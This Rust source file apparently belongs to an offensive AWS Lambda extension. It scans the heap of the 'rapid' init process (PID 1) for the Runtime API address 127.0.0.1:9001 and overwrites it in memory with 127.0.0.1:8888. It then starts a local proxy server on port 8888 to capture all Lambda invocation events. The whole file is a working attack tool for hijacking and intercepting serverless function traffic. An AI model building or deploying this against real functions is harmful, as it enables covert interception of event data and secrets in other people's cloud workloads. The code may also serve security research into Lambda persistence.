mod cverror;
use cverror::CvResult;

mod mem;
use mem::{
    get_proc_maps,
    memmem,
    proc_read_vm,
    proc_write_vm
};

mod net;
use net:: {
    start_api_svr
};

// Lambda includes
use lambda_extension::{service_fn, Error, LambdaEvent, NextEvent};

// PID 1 will be rapid since it is the Init process
const TARGET_PID: i32 = 1;
// Environment variable we will snipe out of rapid's heap
const TARGET_ENV_VAR: &[u8] = b"127.0.0.1:9001";
const NEW_ENV_VAR: &[u8] = b"127.0.0.1:8888";


async fn ls_ext(event: LambdaEvent) -> Result<(), Error> {
    match event.next {
        NextEvent::Shutdown(_e) => {
            // TODO: Cleanly exit on shutdown event
        }
        NextEvent::Invoke(_e) => {
        }
    }
    Ok(())
}

/// Overwrite the target environment variable from the init process to
/// control child processes that spawn
fn patch_rapid() -> CvResult<()>{

    // Default to the base address used by rapid on amd64
    // Currently rapid uses the same base addresses across all runtime envs
    // This may change in the future - patches accepted to make this dynamic if needed
    let mut heap_base = 0xc000000000;
    // This address will be different for ARM64
    if cfg!(target_arch = "aarch64") {
        heap_base = 0x4000000000;
    }

    let maps = get_proc_maps(1)?;
    let mut writes = 0;
    for mm in maps {
        if mm.start != heap_base {
            continue;
        }

        // Allocate a heap buffer to reuse to scan memory
        let step: usize = 0x10000;
        let mut lbuf = vec![0; step];
        let size = lbuf.len();
        let needle = TARGET_ENV_VAR;

        let rng = std::ops::Range { start: mm.start, end: mm.end };
        for chunk in rng.step_by(step) {
            let rrv = proc_read_vm(TARGET_PID, chunk, &mut lbuf, size)?;
            if rrv == 0 {
                return Err("Failed to read rapid memory".into());
            }
            // Find the target environment variable
            let hit = memmem(&lbuf, needle).unwrap_or(usize::MAX);
            if hit == usize::MAX {
                continue;
            }

            let tgt = chunk + hit;
            println!("Found target env var at: 0x{:x}", tgt);

            // Patch it
            let wrv = proc_write_vm(TARGET_PID, tgt,
                                            NEW_ENV_VAR, NEW_ENV_VAR.len())?;
            if wrv == 0 {
                return Err("Failed to write rapid memory".into());
            }
            println!("Wrote {} bytes to 0x{:x}", wrv, tgt);
            writes += 1;
        }
        break;
    }

    if writes == 0 {
        return Err("Failed to patch rapids memory".into());
    }

    println!("Patched {} instances", writes);

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Error> {

    patch_rapid().unwrap();

    // Start the proxy server used to capture all event activity within
    // the Lambda environment
    tokio::spawn(async move {
        start_api_svr(8888).await;
    });

    // Start the Lambda service boilerplate code
    let func = service_fn(ls_ext);
    lambda_extension::run(func).await

}
